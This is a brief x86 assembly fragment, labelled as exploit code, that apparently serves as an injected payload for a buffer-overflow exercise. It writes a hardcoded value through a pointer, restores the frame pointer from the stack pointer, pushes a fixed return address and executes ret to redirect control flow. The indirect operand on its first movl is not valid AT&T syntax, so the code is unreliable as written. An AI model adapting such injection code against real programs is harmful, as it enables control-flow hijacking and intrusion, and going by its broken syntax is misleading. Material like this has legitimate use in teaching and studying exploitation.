# Exploit code utilizing a label
exploit:
	movl $0x36a55b87, *(%eax)
	movl %esp,%ebp
	add $0x18,%ebp
	push $0x8048bb7
	ret
